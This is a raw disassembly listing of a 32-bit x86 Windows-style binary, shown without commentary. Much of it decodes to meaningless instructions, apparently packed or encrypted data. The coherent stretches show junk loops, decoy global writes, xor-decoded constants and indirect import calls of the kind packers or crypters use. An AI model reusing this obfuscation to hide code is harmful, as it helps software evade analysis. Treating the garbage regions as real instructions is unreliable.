  4052d2:	(bad)  
  4052d3:	mov    BYTE PTR [edi+0x52],bl
  4052d6:	aaa    
  4052d7:	or     cl,0x16
  4052da:	and    BYTE PTR [eax+edx*8+0x68],dl
  4052de:	mov    cl,0x45
  4052e0:	add    DWORD PTR ds:0xbedb5d9f,eax
  4052e6:	outs   dx,BYTE PTR ds:[esi]
  4052e7:	int    0x8c
  4052e9:	test   al,0x60
  4052eb:	out    0x4d,al
  4052ed:	gs jl  0x405293
  4052f0:	xlat   BYTE PTR ds:[ebx]
  4052f1:	pusha  
  4052f2:	xor    eax,DWORD PTR [eax+0x4300d314]
  4052f8:	arpl   WORD PTR [ebp+0x60487d54],dx
  4052fe:	add    esi,DWORD PTR [ebx]
  405300:	cli    
  405301:	cld    
  405302:	sub    eax,0xe6ea2dfe
  405307:	jo     0x405330
  405309:	xchg   esp,eax
  40530a:	in     eax,0xa2
  40530c:	jl     0x405329
  40530e:	adc    bl,BYTE PTR [esi-0x6a24b62]
  405314:	xor    ecx,edi
  405316:	shl    BYTE PTR [ecx],0xe5
  405319:	sub    eax,0x2d5e9fa
  40531e:	dec    ebx
  40531f:	retf   0xae40
  405322:	lds    edi,FWORD PTR [esi-0x46]
  405325:	fwait
  405326:	scas   al,BYTE PTR es:[edi]
  405327:	repnz or eax,DWORD PTR [esi+esi*2+0x65a1f1fa]
  40532f:	adc    edx,DWORD PTR [eax+0x289ede73]
  405335:	fiadd  WORD PTR [esp+esi*4]
  405338:	ss stos BYTE PTR es:[edi],al
  40533a:	fwait
  40533b:	add    cl,bl
  40533d:	cdq    
  40533e:	xor    dh,BYTE PTR [eax+0x6a]
  405341:	cld    
  405342:	or     edi,DWORD PTR ds:0x7563be34
  405348:	jae    0x4052ea
  40534a:	das    
  40534b:	imul   edx,DWORD PTR [edi-0x3496450],0xbfc19c50
  405355:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405356:	inc    edx
  405357:	mov    al,ds:0x47d2997
  40535c:	aam    0x48
  40535e:	lahf   
  40535f:	mov    bl,0xb2
  405361:	push   cs
  405362:	shr    BYTE PTR [ecx+ebp*4],cl
  405365:	xchg   edi,eax
  405366:	xor    DWORD PTR [eax+0x27],eax
  405369:	scas   al,BYTE PTR es:[edi]
  40536a:	mov    ds:0x2d43cb38,al
  40536f:	jne    0x4052fb
  405371:	add    esp,DWORD PTR [eax]
  405373:	xlat   BYTE PTR ds:[ebx]
  405374:	jo     0x405381
  405376:	neg    BYTE PTR [ecx-0x19]
  405379:	mov    eax,ds:0xaded1c98
  40537e:	fcomp  DWORD PTR [esi-0x53]
  405381:	ins    DWORD PTR es:[edi],dx
  405382:	out    dx,eax
  405383:	iret   
  405384:	jnp    0x4053bb
  405386:	ret    0x3769
  405389:	cmp    bh,al
  40538b:	bnd je 0x4053fd
  40538e:	mov    esi,esi
  405390:	lds    eax,FWORD PTR [ebx]
  405392:	dec    edx
  405393:	cmp    cl,ch
  405395:	(bad)  
  405396:	cmp    ebp,DWORD PTR [edx+0x5c0a09ca]
  40539c:	jno    0x40535e
  40539e:	enter  0x135f,0x67
  4053a2:	lds    ebp,FWORD PTR [esi-0x5c71af7]
  4053a8:	(bad)  
  4053a9:	fist   WORD PTR [eax-0x36]
  4053ac:	mov    ds:0x584d980e,al
  4053b1:	(bad)  
  4053b2:	mov    ch,0x84
  4053b4:	mov    ebp,0x2bc9123c
  4053b9:	mov    ebx,0x79243baa
  4053be:	push   0xffffffa5
  4053c0:	test   BYTE PTR [edi-0x340619ab],dl
  4053c6:	jl     0x4053b0
  4053c8:	ja     0x40537c
  4053ca:	add    ebp,ebx
  4053cc:	fwait
  4053cd:	mov    ds:0xf5af7ad4,al
  4053d2:	xor    DWORD PTR [eax-0xc],esp
  4053d5:	jl     0x4053f3
  4053d7:	lods   al,BYTE PTR ds:[esi]
  4053d8:	int    0xb3
  4053da:	mov    ch,0x81
  4053dc:	jb     0x4053a3
  4053de:	inc    ebp
  4053df:	comiss xmm4,xmm5
  4053e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4053e3:	sbb    eax,0x64653be9
  4053e8:	int    0xd
  4053ea:	out    dx,eax
  4053eb:	sub    ebx,DWORD PTR [ebx-0x54d7cf29]
  4053f1:	fmul   QWORD PTR [ebx+0x31d551c]
  4053f7:	jl     0x405461
  4053f9:	xchg   ebx,eax
  4053fa:	test   al,bh
  4053fc:	cmp    al,0x28
  4053fe:	mov    esi,0xd7194e52
  405403:	sahf   
  405404:	xchg   BYTE PTR [edx+0x6f],dh
  405407:	or     BYTE PTR [esi],cl
  405409:	jl     0x40541e
  40540b:	or     dh,BYTE PTR [ecx+ebp*1-0x9]
  40540f:	and    eax,0x76821972
  405414:	mov    ds:0xe71b6f72,eax
  405419:	sbb    BYTE PTR [ecx-0x2941d5dc],dl
  40541f:	inc    edi
  405420:	inc    ebx
  405421:	push   ecx
  405422:	rep lods eax,DWORD PTR ds:[esi]
  405424:	retf   0xc872
  405427:	mov    edx,0xf488da6d
  40542c:	lock mov ds:0xa73cd649,al
  405432:	jnp    0x4053b4
  405434:	push   edi
  405435:	cmp    ch,ch
  405437:	les    ebp,FWORD PTR [esi-0x2615b34f]
  40543d:	dec    BYTE PTR [ebx-0x26283f87]
  405443:	push   ebx
  405444:	clc    
  405445:	scas   al,BYTE PTR es:[edi]
  405446:	fild   QWORD PTR [edi-0x35fbbb50]
  40544c:	enter  0x718f,0x19
  405450:	into   
  405451:	jo     0x4054aa
  405453:	adc    edi,DWORD PTR [ebp-0x4]
  405456:	push   ss
  405457:	or     al,0xc5
  405459:	int    0x37
  40545b:	jmp    0x46a07ad2
  405460:	in     al,dx
  405461:	push   esp
  405462:	push   eax
  405463:	jmp    0xfc821358
  405468:	stc    
  405469:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40546a:	clc    
  40546b:	pop    esp
  40546c:	mov    ?,eax
  40546e:	scas   eax,DWORD PTR es:[edi]
  40546f:	dec    ah
  405471:	inc    cl
  405473:	out    0xea,eax
  405475:	mov    ds:0x4289ab44,al
  40547a:	or     BYTE PTR [ebx+0x558b1c45],cl
  405480:	adc    BYTE PTR [ecx+0x458b0c42],cl
  405486:	and    BYTE PTR [ebx+0x42891055],cl
  40548c:	adc    BYTE PTR [ebx+0x14458bc0],cl
  405492:	test   eax,eax
  405494:	mov    eax,DWORD PTR [ebp+0x8]
  405497:	jne    0x4054a0
  40549d:	mov    eax,DWORD PTR [ebp+0xc]
  4054a0:	xor    eax,ecx
  4054a2:	add    eax,0x32729b
  4054a7:	leave  
  4054a8:	ret    0x1c
  4054ab:	push   ebp
  4054ac:	mov    ebp,esp
  4054ae:	sub    esp,0x78
  4054b1:	mov    eax,ds:0x4121a8
  4054b6:	mov    DWORD PTR [ebp-0x10],eax
  4054b9:	mov    eax,ds:0x4122b4
  4054be:	mov    DWORD PTR [ebp-0x30],eax
  4054c1:	mov    DWORD PTR [ebp-0xc],0xf89c8531
  4054c8:	mov    DWORD PTR [ebp-0x14],0xf89c8532
  4054cf:	mov    eax,ds:0x4304df
  4054d4:	sbb    DWORD PTR ds:0x430445,eax
  4054da:	mov    eax,DWORD PTR [ebp-0xc]
  4054dd:	xor    DWORD PTR ds:0x430471,0x5a75
  4054e7:	push   ebx
  4054e8:	push   esi
  4054e9:	push   edi
  4054ea:	or     DWORD PTR ds:0x430455,0x19e9
  4054f4:	mov    esi,0x7510854
  4054f9:	xor    eax,esi
  4054fb:	mov    edi,0x32729b
  405500:	add    eax,edi
  405502:	or     DWORD PTR ds:0x4304e3,0x57a7
  40550c:	mov    DWORD PTR [ebp-0x20],eax
  40550f:	mov    DWORD PTR [ebp-0x28],0xf89cb531
  405516:	and    DWORD PTR ds:0x430455,0x0
  405520:	jmp    0x405530
  405525:	mov    eax,ds:0x430455
  40552a:	inc    eax
  40552b:	mov    ds:0x430455,eax
  405530:	cmp    DWORD PTR ds:0x430455,0x1d
  405537:	jae    0x4057cb
  40553d:	cmp    DWORD PTR ds:0x430455,0x4
  405544:	jne    0x405555
  40554a:	push   0x35c7
  40554f:	call   DWORD PTR ds:0x42ec17
  405555:	cmp    DWORD PTR ds:0x430455,0x3
  40555c:	jne    0x40556d
  405562:	mov    eax,ds:0x430455
  405567:	inc    eax
  405568:	mov    ds:0x430455,eax
  40556d:	jmp    0x405525
  405572:	mov    DWORD PTR ds:0x430471,0x14
  40557c:	cmp    DWORD PTR ds:0x430471,0x0
  405583:	je     0x4057cb
  405589:	cmp    DWORD PTR ds:0x430471,0x2
  405590:	jne    0x4055a2
  405596:	push   DWORD PTR [ebp-0x20]
  405599:	push   DWORD PTR [ebp-0x20]
  40559c:	call   DWORD PTR ds:0x42eaa3
  4055a2:	cmp    DWORD PTR ds:0x430471,0x3
  4055a9:	jne    0x4055bd
  4055af:	xor    eax,eax
  4055b1:	xor    eax,DWORD PTR ds:0x430471
  4055b7:	dec    eax
  4055b8:	mov    ds:0x430471,eax
  4055bd:	mov    eax,ds:0x430471
  4055c2:	dec    eax
  4055c3:	mov    ds:0x430471,eax
  4055c8:	jmp    0x40557c
  4055cd:	or     DWORD PTR ds:0x42edd3,edi
  4055d3:	jmp    0x4057cb
  4055d8:	jl     0x405580
  4055da:	inc    bl
  4055dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4055dd:	jecxz  0x405620
  4055df:	popa   
  4055e0:	xor    eax,0x13a2c60a
  4055e5:	rcr    DWORD PTR [edi+0x1b],1
  4055e8:	sub    bh,BYTE PTR ss:[esi+0x7e]
  4055ec:	push   ebp
  4055ed:	jg     0x40566d
  4055ef:	jle    0x40560a
  4055f1:	inc    edi
  4055f2:	outs   dx,BYTE PTR ds:[esi]
  4055f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4055f4:	fisub  DWORD PTR [ebp*4-0x172bb38f]
  4055fb:	mov    eax,0xa451aaff
  405600:	or     edx,0x19
  405603:	ror    BYTE PTR [ebx],1
  405605:	mov    ecx,0xd36c17a3
  40560a:	dec    esi
  40560b:	inc    ecx
  40560c:	ja     0x405615
  40560e:	repz repz icebp 
  405611:	test   al,0x7b
  405613:	mov    esp,0x691c90bc
  405618:	mov    esp,DWORD PTR [ebx+edi*4-0x9fb69ca]
  40561f:	stc    
  405620:	ins    BYTE PTR es:[edi],dx
  405621:	nop
  405622:	pop    ss
  405623:	add    DWORD PTR [ebp+0x54],esp
  405626:	inc    edx
  405627:	cdq    
  405628:	dec    edi
  405629:	sub    cl,0x6
  40562c:	cmp    ch,BYTE PTR [ebx-0x32]
  40562f:	call   0x1fe3:0x47f3c623
  405636:	and    ebx,ebp
  405638:	add    eax,0x6b0e250d
  40563d:	push   0x22a15271
  405642:	add    BYTE PTR [edx-0x35],ch
  405645:	stc    
  405646:	stos   BYTE PTR es:[edi],al
  405647:	(bad)  
  405648:	stc    
  405649:	dec    edi
  40564a:	sahf   
  40564b:	cmp    BYTE PTR [edx-0x3fb4dd71],ah
  405651:	lods   al,BYTE PTR ds:[esi]
  405652:	mov    al,ds:0xfe7ddd96
  405657:	je     0x4056b8
  405659:	cs fs in eax,dx
  40565c:	mov    al,0x7d
  40565e:	js     0x4056ab
  405660:	mov    edx,0x27b330ac
  405665:	mov    esp,0x579cba4f
  40566a:	jnp    0x405686
  40566c:	outs   dx,DWORD PTR ds:[esi]
  40566d:	dec    esi
  40566e:	aas    
  40566f:	push   esi
  405670:	xor    al,0xbe
  405672:	cmp    ebx,DWORD PTR [edi-0x73]
  405675:	mov    al,0xc8
  405677:	jns    0x40563f
  405679:	and    DWORD PTR [eax+eax*4],esi
  40567c:	add    dh,dl
  40567e:	add    bl,BYTE PTR [edi]
  405680:	imul   BYTE PTR [esi-0x73e74b4d]
  405686:	push   es
  405687:	inc    ebp
  405688:	pop    ebx
  405689:	rcr    DWORD PTR [ebx+0x66840463],cl
  40568f:	std    
  405690:	ins    BYTE PTR es:[edi],dx
  405691:	daa    
  405692:	bound  edx,QWORD PTR [ebx]
  405694:	pop    ebp
  405695:	mov    ebp,0xbe28072e
  40569a:	add    eax,0x5e666ca5
  40569f:	pushf  
  4056a0:	mov    bl,BYTE PTR [ebp+edx*1+0x3580843d]
  4056a7:	call   0x584f:0xe6bfec94
  4056ae:	loopne 0x4056ad
  4056b0:	ret    0x727a
  4056b3:	syscall 
  4056b5:	xchg   BYTE PTR [edi+0x6cfdb457],al
  4056bb:	jae    0x405709
  4056bd:	(bad)  
  4056be:	xor    dl,BYTE PTR [edx-0x7b]
  4056c1:	or     BYTE PTR [ecx],dl
  4056c3:	mov    dl,0x65
  4056c5:	pop    edx
  4056c6:	or     ch,BYTE PTR [edi-0x63]
  4056c9:	adc    al,0x42
  4056cb:	jp     0x40566b
  4056cd:	stc    
  4056ce:	int    0x51
  4056d0:	push   cs
  4056d1:	mov    bl,0x7b
  4056d3:	pop    ecx
  4056d4:	in     al,dx
  4056d5:	ja     0x405714
  4056d7:	xchg   ebp,eax
  4056d8:	fimul  WORD PTR [ebx]
  4056da:	rcr    BYTE PTR [edx],cl
  4056dc:	push   ss
  4056dd:	mov    edx,0x5c90e69f
  4056e2:	pop    eax
  4056e3:	sbb    eax,0x8cb68fff
  4056e8:	mov    ah,0x84
  4056ea:	dec    eax
  4056eb:	test   al,0xdc
  4056ed:	mov    bh,0xf7
  4056ef:	jge    0x405753
  4056f1:	inc    esp
  4056f2:	loope  0x405707
  4056f4:	jp     0x405729
  4056f6:	or     eax,0x4da947d9
  4056fb:	or     esp,DWORD PTR [edi-0x724b955a]
  405701:	xchg   ebp,eax
  405702:	sub    DWORD PTR [ecx],esp
  405704:	pop    eax
  405705:	(bad)  
  405706:	sub    BYTE PTR [eax+0x39e077cf],ch
  40570c:	ja     0x4056ed
  40570e:	lahf   
  40570f:	mov    eax,ds:0xc1913f50
  405714:	jae    0x405748
  405716:	cli    
  405717:	rol    BYTE PTR ds:0x914269e5,cl
  40571d:	or     al,0x64
  40571f:	inc    esi
  405720:	ror    esi,cl
  405722:	out    dx,al
  405723:	xchg   esi,eax
  405724:	cld    
  405725:	rcr    DWORD PTR [ecx],1
  405727:	sbb    ebp,DWORD PTR [eax-0xa643e5d]
  40572d:	fwait
  40572e:	js     0x40576f
  405730:	repnz rol BYTE PTR [ebx],cl
  405733:	outs   dx,DWORD PTR ds:[esi]
  405734:	cdq    
  405735:	sti    
  405736:	mov    bl,0x72
  405738:	hlt    
  405739:	push   cs
  40573a:	pop    ds
  40573b:	mov    al,BYTE PTR [edi+0x5e]
  40573e:	inc    ecx
  40573f:	mov    al,ds:0xae51442e
  405744:	cmp    ecx,DWORD PTR [ebx]
  405746:	cmp    al,0x58
  405748:	mov    dh,0x67
  40574a:	(bad)  
  40574b:	cmovg  esp,DWORD PTR ds:0x74352bc5
  405752:	jae    0x4056e6
  405754:	aad    0x16
  405756:	pop    es
  405757:	mov    dl,0xf8
  405759:	in     al,dx
  40575a:	retf   
  40575b:	jo     0x405752
  40575d:	sub    eax,0x989a8f1f
  405762:	inc    ebp
  405763:	push   0x13746e09
  405768:	xchg   ecx,eax
  405769:	cmp    eax,0xf5635efc
  40576e:	js     0x405714
  405770:	ficom  WORD PTR [edx+0x52d74dbf]
  405776:	int3   
  405777:	ficom  WORD PTR [edx-0x3e403e0]
  40577d:	div    al
  40577f:	loop   0x405709
  405781:	aad    0xb2
  405783:	sub    BYTE PTR [ebp+0xa5dbf4f],ah
  405789:	dec    ecx
  40578a:	pop    edi
  40578b:	test   BYTE PTR [esi+0x68],ch
  40578e:	lds    ebx,FWORD PTR [esi-0x2eecc06f]
  405794:	jp     0x4057c5
  405796:	inc    ecx
  405797:	sub    eax,0x63ba05ec
  40579c:	jnp    0x40578a
  40579e:	mov    esi,0x79d7e4a9
  4057a3:	out    dx,al
  4057a4:	jnp    0x405779
  4057a6:	xor    cl,BYTE PTR [ebx]
  4057a8:	mov    eax,ds:0xaa802023
  4057ad:	push   edx
  4057ae:	test   ebp,eax
  4057b0:	cmp    eax,0x8acedca7
  4057b5:	stc    
  4057b6:	sbb    BYTE PTR [eax-0x34],dh
  4057b9:	cmp    BYTE PTR [ecx],ch
  4057bb:	sbb    BYTE PTR [ecx],0xf
  4057be:	retf   0xf8fc
  4057c1:	js     0x4057bb
  4057c3:	sub    eax,0xa645f4f7
  4057c8:	xor    eax,0x45c7b9b9
  4057cd:	int3   
  4057ce:	xor    DWORD PTR ds:0x5c7f89f,eax
  4057d4:	fucomi st,st(5)
  4057d6:	inc    edx
  4057d7:	add    BYTE PTR [edx],bl
  4057d9:	add    BYTE PTR [eax],al
  4057db:	add    BYTE PTR [ebx+0x42eddb3d],al
  4057e1:	add    BYTE PTR [eax],al
  4057e3:	je     0x405811
  4057e9:	cmp    DWORD PTR ds:0x42eddb,0x29
  4057f0:	jne    0x4057ff
  4057f6:	push   DWORD PTR [ebp-0x24]
  4057f9:	call   DWORD PTR ds:0x42e9d7
  4057ff:	mov    eax,ds:0x42eddb
  405804:	dec    eax
  405805:	mov    ds:0x42eddb,eax
  40580a:	jmp    0x4057dc
  40580f:	neg    eax
  405811:	mov    DWORD PTR [ebp-0x2c],0xf89c85f1
  405818:	mov    eax,ds:0x42e7c8
  40581d:	or     DWORD PTR ds:0x430445,eax
  405823:	mov    DWORD PTR [ebp-0x24],0xf89c85d1
  40582a:	mov    eax,DWORD PTR [ebp-0xc]
  40582d:	and    DWORD PTR ds:0x430439,0x7e31
  405837:	xor    eax,esi
  405839:	add    eax,edi
  40583b:	mov    DWORD PTR [ebp-0x18],eax
  40583e:	sbb    DWORD PTR ds:0x42e7d4,0x48a8
  405848:	mov    DWORD PTR [ebp-0x1c],0xf89c853e
  40584f:	sub    eax,DWORD PTR ds:0x42edef
  405855:	mov    BYTE PTR [ebp-0x1],0x67
  405859:	mov    DWORD PTR ds:0x42eddb,0x1c
  405863:	cmp    DWORD PTR ds:0x42eddb,0x0
  40586a:	je     0x4058ae
  405870:	cmp    DWORD PTR ds:0x42eddb,0xe
  405877:	jne    0x405886
  40587d:	push   DWORD PTR [ebp-0x18]
  405880:	call   DWORD PTR ds:0x42e9db
  405886:	cmp    DWORD PTR ds:0x42eddb,0xf
  40588d:	jne    0x40589e
  405893:	mov    eax,ds:0x42eddb
  405898:	dec    eax
  405899:	mov    ds:0x42eddb,eax
  40589e:	mov    eax,ds:0x42eddb
  4058a3:	dec    eax
  4058a4:	mov    ds:0x42eddb,eax
  4058a9:	jmp    0x405863
  4058ae:	mov    eax,DWORD PTR [ebp-0xc]
  4058b1:	or     DWORD PTR ds:0x430441,0x42edd3
  4058bb:	xor    eax,esi
  4058bd:	add    eax,edi
  4058bf:	mov    DWORD PTR [ebp-0x18],eax
  4058c2:	mov    eax,DWORD PTR [ebp-0x24]
  4058c5:	sbb    DWORD PTR ds:0x430435,0x42e7c4
  4058cf:	xor    eax,esi
  4058d1:	sbb    DWORD PTR ds:0x4304d3,0xd15
  4058db:	add    eax,edi
  4058dd:	inc    DWORD PTR ds:0x43045d
  4058e3:	push   eax
  4058e4:	xor    eax,eax
  4058e6:	xor    eax,DWORD PTR ds:0x43043d
  4058ec:	xor    DWORD PTR ds:0x430461,eax
  4058f2:	mov    eax,DWORD PTR [ebp-0x28]
  4058f5:	sub    DWORD PTR ds:0x430451,0x42edef
  4058ff:	xor    eax,esi
  405901:	or     DWORD PTR ds:0x430441,0x42e7c8
  40590b:	add    eax,edi
  40590d:	push   eax
  40590e:	or     eax,DWORD PTR ds:0x430441
  405914:	mov    eax,DWORD PTR [ebp-0x1c]
  405917:	or     DWORD PTR ds:0x42edd3,0x39ed
  405921:	xor    eax,esi
  405923:	not    DWORD PTR ds:0x42edeb
  405929:	add    eax,edi
  40592b:	adc    DWORD PTR ds:0x430469,0x4304eb
  405935:	push   eax
  405936:	sbb    DWORD PTR ds:0x430469,0x42e7c8
  405940:	lea    eax,[ebp-0x78]
  405943:	push   eax
  405944:	dec    DWORD PTR ds:0x4304d3
  40594a:	push   DWORD PTR [ebp-0xc]
  40594d:	sub    DWORD PTR ds:0x4304d3,0x42e7d4
  405957:	push   DWORD PTR [ebp-0x14]
  40595a:	and    DWORD PTR ds:0x43043d,0x42eddb
  405964:	call   0x4046ad
  405969:	test   eax,eax
  40596b:	je     0x405da5
  405971:	lea    eax,[ebp-0x78]
  405974:	sbb    DWORD PTR ds:0x42edcf,0x42edeb
  40597e:	push   eax
  40597f:	movzx  eax,BYTE PTR ds:0x430455
  405986:	sbb    eax,DWORD PTR ds:0x43046d
  40598c:	mov    ds:0x430455,eax
  405991:	jmp    0x405b89
  405996:	xor    DWORD PTR [ecx+0x5c],esi
  405999:	sbb    eax,0x7171315c
  40599e:	repnz fistp WORD PTR [esi-0x48]
  4059a2:	test   DWORD PTR [ecx],edx
  4059a4:	sbb    eax,0x7e280d05
  4059a9:	jle    0x405a00
  4059ab:	jg     0x405a2b
  4059ad:	jle    0x40595f
  4059af:	cld    
  4059b0:	cmp    al,0xf7
  4059b2:	sub    edi,DWORD PTR [eax+ecx*8+0x65dc551d]
  4059b9:	mov    dh,0xa7
  4059bb:	imul   ecx,DWORD PTR [ebp-0x50],0xffffffff
  4059bf:	ins    BYTE PTR es:[edi],dx
  4059c0:	bound  esi,QWORD PTR [edi+0x59]
  4059c3:	cli    
  4059c4:	cld    
  4059c5:	or     edi,DWORD PTR [eax+0x11]
  4059c8:	mov    ebx,0xba09c9a8
  4059cd:	(bad)  
  4059ce:	aad    0x86
  4059d0:	shl    BYTE PTR [edx+ebp*4+0x16],0x33
  4059d5:	push   ecx
  4059d6:	inc    edi
  4059d7:	push   0x6e53be60
  4059dc:	mov    edi,0xf4f10f9d
  4059e1:	mov    al,ds:0x47f8e1f9
  4059e6:	xor    al,0xde
  4059e8:	jp     0x405a64
  4059ea:	push   0x651f6ee9
  4059ef:	sbb    DWORD PTR [bx+0x32],ecx
  4059f3:	add    ah,BYTE PTR [eax+0x77a70b3b]
  4059f9:	jns    0x4059f3
  4059fb:	xchg   edi,eax
  4059fc:	(bad)  
  4059fd:	mov    edi,0xa03ccec8
  405a02:	sub    dh,bl
  405a04:	xchg   esp,eax
  405a05:	int3   
  405a06:	out    0x85,eax
  405a08:	(bad)  
  405a0a:	addr16 cdq 
  405a0c:	sti    
  405a0d:	xchg   ebp,eax
  405a0e:	in     al,dx
  405a0f:	rcl    edx,1
  405a11:	sbb    al,0x58
  405a13:	dec    edi
  405a14:	add    eax,0xe74bd7ef
  405a19:	out    0xd7,eax
  405a1b:	out    dx,eax
  405a1c:	jmp    0x4059fa
  405a1e:	ret    0x5467
  405a21:	add    eax,0x9fff8ee5
  405a26:	hlt    
  405a27:	sub    eax,0x702ee23b
  405a2c:	jg     0x405a2b
  405a2e:	push   es
  405a2f:	(bad)  
  405a30:	retf   0xc0c7
  405a33:	and    al,0x39
  405a35:	inc    ebx
  405a36:	push   cs
  405a37:	xchg   esp,eax
  405a38:	push   0x8ecbede2
  405a3d:	mov    ebp,0x2baaad5f
  405a42:	push   ebp
  405a43:	leave  
  405a44:	mov    edx,0x48b515a6
  405a49:	xchg   ecx,eax
  405a4a:	stc    
  405a4b:	push   esi
  405a4c:	ja     0x4059e5
  405a4e:	cwde   
  405a4f:	in     eax,0x5d
  405a51:	test   ebp,esi
  405a53:	fimul  WORD PTR [esi]
  405a55:	aaa    
  405a56:	add    al,BYTE PTR [edi-0x5c932151]
  405a5c:	adc    cl,cl
  405a5e:	lods   al,BYTE PTR ds:[esi]
  405a5f:	inc    edi
  405a60:	out    dx,eax
  405a61:	mov    edx,0x2868dee3
  405a66:	mov    dl,0xde
  405a68:	fs repz popf 
  405a6b:	das    
  405a6c:	scas   al,BYTE PTR es:[edi]
  405a6d:	lods   eax,DWORD PTR ds:[esi]
  405a6e:	popa   
  405a6f:	out    dx,eax
  405a70:	scas   eax,DWORD PTR es:[edi]
  405a71:	mov    dl,0x89
  405a73:	retf   0x3e76
  405a76:	aas    
  405a77:	sub    bl,BYTE PTR [ebx]
  405a79:	sub    al,BYTE PTR [eax]
  405a7b:	cmp    BYTE PTR [ebp+esi*2+0x256907f6],dl
  405a82:	into   
  405a83:	ret    
  405a84:	lds    edi,FWORD PTR [ebx+0x76308192]
  405a8a:	mov    ecx,0xc37e1e0d
  405a8f:	jle    0x405af1
  405a91:	dec    ecx
  405a92:	sti    
  405a93:	push   0xffffffe6
  405a95:	clc    
  405a96:	outs   dx,BYTE PTR ds:[esi]
  405a97:	cmp    eax,esp
  405a99:	adc    eax,0x97f9b82c
  405a9e:	sbb    dl,BYTE PTR [edi]
  405aa0:	mov    esp,DWORD PTR [ebp+eax*1+0x35]
  405aa4:	and    eax,0x2785462b
  405aa9:	xchg   ecx,eax
  405aaa:	cdq    
  405aab:	adc    al,0x8a
  405aad:	sbb    cl,BYTE PTR [edi]
  405aaf:	clc    
  405ab0:	adc    eax,ecx
  405ab2:	js     0x405aca
  405ab4:	imul   edx,esi,0x4c
  405ab7:	imul   BYTE PTR [esi]
  405ab9:	mov    eax,ds:0xd3aa0b04
  405abe:	xlat   BYTE PTR ds:[ebx]
  405abf:	push   esp
  405ac0:	js     0x405b24
  405ac2:	mov    al,0xfc
  405ac4:	(bad)  
  405ac5:	rcr    DWORD PTR [edi-0xb],cl
  405ac8:	mov    WORD PTR [ecx],?
  405aca:	sub    bl,BYTE PTR [edi-0x3cd4669c]
  405ad0:	int    0x83
  405ad2:	mov    al,ds:0x4933cab9
  405ad7:	pop    ecx
  405ad8:	dec    esp
  405ad9:	ins    DWORD PTR es:[edi],dx
  405ada:	cdq    
  405adb:	lock jg 0x405b34
  405ade:	cmp    esi,DWORD PTR ds:0x1a622be4
  405ae4:	hlt    
  405ae5:	mov    edi,0x509e779c
  405aea:	xlat   BYTE PTR ds:[ebx]
  405aeb:	mov    gs,WORD PTR [ebp-0x9e7a10b]
  405af1:	cmp    edx,edi
  405af3:	and    ebp,DWORD PTR [ecx+esi*8+0x17367176]
  405afa:	jo     0x405aaa
  405afc:	mov    bl,0xb7
  405afe:	and    BYTE PTR [esi+0xc4cdcf8],dl
  405b04:	pop    ds
  405b05:	xchg   esp,eax
  405b06:	lahf   
  405b07:	inc    edi
  405b08:	imul   esp,DWORD PTR [edi-0x5f],0xffffff82
  405b0c:	inc    ebx
  405b0d:	mov    cl,0x99
  405b0f:	push   0x19
  405b11:	nop
  405b12:	sbb    ecx,esp
  405b14:	scas   eax,DWORD PTR es:[edi]
  405b15:	sahf   
  405b16:	dec    ebp
  405b17:	into   
  405b18:	retf   0x15a1
  405b1b:	add    bh,BYTE PTR [esi-0x9e6df8]
  405b21:	sub    cl,cl
  405b23:	call   DWORD PTR [eax]
  405b25:	mov    ds:0xff40f8a0,al
  405b2a:	push   eax
  405b2b:	cmc    
  405b2c:	pop    edx
  405b2d:	sbb    BYTE PTR [ecx-0x527f9137],0x22
  405b34:	enter  0x3818,0xeb
  405b38:	mov    cs,edi
  405b3a:	mov    cl,0xaf
  405b3c:	xchg   edi,eax
  405b3d:	mov    ds:0xe0df4f5c,eax
  405b42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b43:	mov    esp,0xaceff855
  405b48:	jle    0x405b78
  405b4a:	aam    0x13
  405b4c:	jno    0x405b39
  405b4e:	cmp    eax,0x14ac56d8
  405b53:	xchg   esi,eax
  405b54:	adc    BYTE PTR [edx+0x32cb1b00],dh
  405b5a:	add    eax,esi
  405b5c:	push   esi
  405b5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b5e:	enter  0xf42d,0x39
  405b62:	es inc esp
  405b64:	inc    di
  405b66:	or     bh,0xca
  405b69:	mov    esp,0x49a5f816
  405b6e:	outs   dx,DWORD PTR ds:[esi]
  405b6f:	inc    edx
  405b70:	sets   BYTE PTR [edx+0x59098311]
  405b77:	test   BYTE PTR [eax],0x45
  405b7a:	sbb    al,0x69
  405b7c:	sub    BYTE PTR [esi-0x2d],0xe3
  405b80:	retf   
  405b81:	leave  
  405b82:	icebp  
  405b83:	repz pop edi
  405b85:	imul   esi,DWORD PTR [ecx+0x458b9a82],0xffffffec
  405b8c:	xor    eax,esi
  405b8e:	add    eax,edi
  405b90:	push   eax
  405b91:	mov    eax,DWORD PTR [ebp-0x10]
  405b94:	add    eax,0xaa
  405b99:	push   eax
  405b9a:	jmp    0x405d92
  405b9f:	jne    0x405bbe
  405ba1:	adc    eax,0x71b155b1
  405ba6:	fld    DWORD PTR [edi+0x3f]
  405ba9:	mov    dh,0xdb
  405bab:	daa    
  405bac:	es shr ch,1
  405baf:	pusha  
  405bb0:	sub    DWORD PTR [esi+0x7e],edi
  405bb3:	push   ebp
  405bb4:	jg     0x405c34
  405bb6:	jle    0x405b85
  405bb8:	(bad)  
  405bb9:	repnz test eax,0x90dc158
  405bbf:	cs iret 
  405bc1:	sub    DWORD PTR [ebp+0x18acb24e],esp
  405bc7:	mov    dh,0xb3
  405bc9:	repnz sar bh,1
  405bcc:	mov    bl,0x81
  405bce:	xchg   ebp,eax
  405bcf:	aaa    
  405bd0:	push   esi
  405bd1:	pushf  
  405bd2:	xor    cl,al
  405bd4:	movd   mm4,DWORD PTR [edi+ecx*4]
  405bd8:	loop   0x405bd5
  405bda:	mov    eax,ecx
  405bdc:	fcomp  QWORD PTR [ebx-0x4d]
  405bdf:	(bad)  [edi-0x28]
  405be2:	cwde   
  405be3:	pop    es
  405be4:	icebp  
  405be5:	daa    
  405be6:	and    al,0x9f
  405be8:	aas    
  405be9:	mov    ebp,0xe817928e
  405bee:	fisubr DWORD PTR [edi]
  405bf0:	sbb    eax,0xe6c3ec58
  405bf5:	push   ds
  405bf6:	lahf   
  405bf7:	cs je  0x405bb2
  405bfa:	idiv   BYTE PTR [eax-0x6f00b442]
